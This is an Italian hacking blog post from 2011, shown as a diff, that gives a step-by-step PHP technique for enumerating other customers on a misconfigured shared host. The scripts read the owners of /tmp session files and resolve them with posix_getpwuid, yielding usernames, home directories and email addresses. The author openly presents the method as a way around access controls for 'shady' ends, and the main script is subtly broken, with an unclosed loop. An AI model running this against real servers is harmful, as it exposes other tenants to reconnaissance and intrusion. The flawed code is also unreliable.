@@ -1,0 +1,104 @@
+Date: 2011-01-26 15:46:20
+Author: evilsocket
+Categories: Exploiting, Hacking, Papers, Web Hacking
+Tags: bypass, enumeration, fileowner, getcwd, glob, opendir, owner, permission denied, PHP, posix_getpwuid, readdir, security
+Title: PHP Users Enumeration Security Bypass
+
+Ed eccoci in un altro articolo che, come il <a href="http://www.evilsocket.net/2061/php-local-session-manipulation-e-configurazione-sbagliata-dei-permessi.html" target="_blank">precedente</a>, descrive un ulteriore problematica dovuta ad una cattiva configurazione di un server di shared hosting ^^.
+
+Abbiamo parlato della /tmp, dei file di sessione e di come manipolarli per i nostri (loschi) scopi, ora vedremo come superare dei permessi restrittivi che non ci consentono di elencare le home directory (quindi le cartelle htdocs) degli altri utenti sul nostro server.
+
+Prima di tutto, sul nostro sito eseguiamo lo script che segue per determinare in che cartella ci troviamo:
+<pre>
+  <code>
+    &lt;?php
+      die(getcwd());
+    ?&gt;
+  </code>
+</pre>
+
+<break>
+
+Il che ci restituirà una stringa del tipo '/home/www/nostrosito.com' ... proviamo ora ad enumerare gli altri siti/utenti nella cartella /home/www come si farebbe normalmente in PHP:
+
+<pre>
+  <code>
+&lt;?php
+    if ($handle = opendir('/home/www/')) {
+        while (false !== ($file = readdir($handle))) {
+            if ($file != "." &amp;&amp; $file != "..") {
+                echo "$file\n";
+            }
+        }
+        closedir($handle);
+    }
+?&gt;
+  </code>
+</pre>
+
+Ed indovinate un po? Ci troveremo davanti l'errore:
+
+<pre><code>Warning: opendir(/home/www/) [function.opendir]: failed to open dir: Permission denied in /home/www/nostrosito.com/prova.php on line 5</code></pre>
+
+Uuuuuu che cattivoni! A noi quel Permission denied non piace per niente vero? :P
+
+Bene! Sfruttiamo la /tmp ed i file di sessione nel seguente modo:
+<ul>
+	<li>Elenchiamo tutti i file di sessione (volendo proprio tutti per esser sicuri) nella /tmp</li>
+	<li>Per ognuno, prendiamo l'uid dell'owner, quindi dell'utente al quale appartiene, tramite la funzione PHP <a href="http://php.net/manual/en/function.fileowner.php" target="_blank">fileowner</a></li>
+	<li>Avendo l'uid, tiriamo fuori il nostro kung-fu e prendiamoci le altre informazioni (gid, home path, ecc) tramite la funzione <a href="http://www.php.net/manual/en/function.posix-getpwuid.php" target="_blank">posix_getpwuid</a> :D</li>
+	<li>Il gioco è fatto</li>
+</ul>
+Lo script è il seguente:
+<pre>
+  <code>
+  &lt;?php
+    $files = glob( "/tmp/sess_*" );
+    $users = array();
+    foreach( $files as $file ){
+      $owner = fileowner($file);
+      $user  = posix_getpwuid($owner);
+      if( !in_array( $user, $users ) ){
+        $users[] = $user;
+      }
+      
+    foreach( $users as $user ){
+      $info = str_replace( ' ', '&amp;nbsp;', print_r($user,true) );
+      echo nl2br($info);
+    }
+?&gt;
+  </code>
+</pre>
+
+Ed avremo la nostra bella lista, del tipo:
+<pre>
+  <code>
+  Array
+  (
+    [name] =&gt; pierino.it
+    [passwd] =&gt; *
+    [uid] =&gt; 52417
+    [gid] =&gt; 52417
+    [gecos] =&gt; pierino.it@pierino.it
+    <strong> [dir] =&gt; /home/www/pierino.it </strong>
+    [shell] =&gt; /bin/true
+  )
+
+  Array
+  (
+    [name] =&gt; foobar.com
+    [passwd] =&gt; *
+    [uid] =&gt; 61240
+    [gid] =&gt; 61240
+    [gecos] =&gt; foobar.com@foobar.com
+    <strong> [dir] =&gt; /home/www/foobar.com </strong>
+    [shell] =&gt; /bin/true
+  )
+
+  ...
+  </code>
+</pre>
+
+Bingoooo, ecco la lista degli utenti apache e delle rispettive home directory / htdocs (cazzio pure le email :D) ... come si diceva?
+<br>
+<p style="text-align: center;"><strong>My Kung Fu Is Stronger Than Yours!!!!!</strong></p>
